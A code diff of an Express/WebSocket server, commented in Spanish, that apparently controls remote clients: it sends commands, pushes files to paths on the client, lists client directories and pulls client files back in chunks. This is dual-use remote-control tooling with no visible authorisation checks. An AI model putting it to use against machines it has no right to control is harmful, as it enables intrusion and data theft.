@@ -1,4 +1,5 @@
 import { response } from "express";
+import fs from 'fs';
 
 const send_cmd = async (clients, req, res) => {
     const clientId = req.params.id;
@@ -28,66 +29,80 @@ const send_cmd = async (clients, req, res) => {
         }
     }, 5000);
 };
-
-const upload_file = async(clients,req,res) => {
-
+const upload_file = async (clients, req, res) => {
     try {
-
-        console.log("subida");
-        
         const clientId = req.params.id;
         const client = clients.get(clientId);
+        const destination = req.body.destination;
 
-        const destination=req.body.destination;
-        
-        
         if (!client || client.readyState !== 1) {
             return res.status(404).json({ error: 'Cliente no conectado' });
         }
 
-
-        
-        // Envía el comando
-        
-        const chunkSize = 64 * 1024; // 64 KB
+        const chunkSize = 64 * 1024;
         const buffer = req.file.buffer;
-        
-        
         let offset = 0;
+
+        // Crear una promesa para esperar confirmación
+        const uploadConfirmed = new Promise((resolve, reject) => {
+            const handleMessage = (message) => {
+                try {
+                    const msg = JSON.parse(message);
+                    if (msg.status === "upload_complete") {
+                        client.off('message', handleMessage);
+                        resolve();
+                    }
+                } catch (e) {}
+            };
+
+            client.on('message', handleMessage);
+
+            setTimeout(() => {
+                client.off('message', handleMessage);
+                reject(new Error("Timeout esperando confirmación"));
+            }, 100000);
+        });
+
+        // Enviar los chunks
         while (offset < buffer.length) {
             const chunk = buffer.slice(offset, offset + chunkSize);
             client.send(JSON.stringify({
                 destination,
                 chunk: {
-                    data: chunk.toString('base64'), // conviertes a base64
+                    data: chunk.toString('base64'),
                     last: offset + chunkSize >= buffer.length
                 }
             }));
             offset += chunkSize;
         }
 
+        // Esperar a que el cliente C# confirme que terminó
+        await uploadConfirmed;
 
-        return res.status(200).json({msg:"Subida correcta"})
-        
+        return res.status(200).json({ ok:true, msg: "Subida correcta" });
+
     } catch (error) {
-        return res.status(400).json({msg:"Error al subir"})
+        console.error("Error en subida:", error);
+        return res.status(400).json({ ok:false, msg: "Error al subir" });
     }
-
 };
+
+
 
 
 const getFiles= async(clients, req, res = response) => {
 
-    const path = req.query.path || "/";
-    const clientId = req.params.id;
-    const client = clients.get(clientId);
+    const path = req.body.path || "/";
+    const clientId = req.body.id;
 
+    const client = clients.get(clientId);
 
     if (!client || client.readyState !== 1) {
         return res.status(404).json({ error: 'Cliente no conectado' });
     }
 
     const msgHandler = (msg) => {
+
         try {
             const parsed = JSON.parse(msg);
             res.status(200).json(parsed);
@@ -112,34 +127,45 @@ const getFiles= async(clients, req, res = response) => {
 
 // Descargar archivo
 const downloadFiles=async (clients, req, res = response) => {
-    const path = req.query.path || "/";
-    const clientId = req.params.id;
+    const path = req.body.path || "/";
+    const clientId = req.body.id;
     const client = clients.get(clientId);
+
 
     if (!client || client.readyState !== 1) {
         return res.status(404).json({ error: 'Cliente no conectado' });
-    }
+    } 
 
-    // Handler que se ejecuta al recibir mensaje del cliente Python
+    let receivedChunks = [];
+    let expectedFile = null;
+
     const msgHandler = (msg) => {
         try {
             const parsed = JSON.parse(msg);
 
-            // Validamos si llegó contenido base64
-            if (parsed.content) {
-                const fileBuffer = Buffer.from(parsed.content, "base64");
-                res.setHeader("Content-Disposition", `attachment; filename="${parsed.filename || "archivo.bin"}"`);
-                res.setHeader("Content-Type", "application/octet-stream");
-                res.send(fileBuffer);
-            } else {
-                res.status(404).json({ error: parsed.error || "Archivo no encontrado" });
+            if (parsed.chunk) {
+                receivedChunks.push(Buffer.from(parsed.chunk, 'base64'));
+
+                if (!expectedFile) expectedFile = parsed.filename || 'archivo.bin';
+
+                if (parsed.last) {
+                    const fileBuffer = Buffer.concat(receivedChunks);
+                    res.setHeader("Content-Disposition", `attachment; filename="${expectedFile}"`);
+                    res.setHeader("Content-Type", "application/octet-stream");
+                    res.send(fileBuffer);
+
+                    client.off('message', msgHandler);
+                    receivedChunks = [];
+                    expectedFile = null;
+                }
+            } else if (parsed.error) {
+                res.status(404).json({ error: parsed.error });
+                client.off('message', msgHandler);
             }
         } catch (e) {
             res.status(500).json({ error: "Error procesando archivo" });
+            client.off('message', msgHandler);
         }
-
-        // Limpiamos el listener
-        client.off('message', msgHandler);
     };
 
     client.on('message', msgHandler);
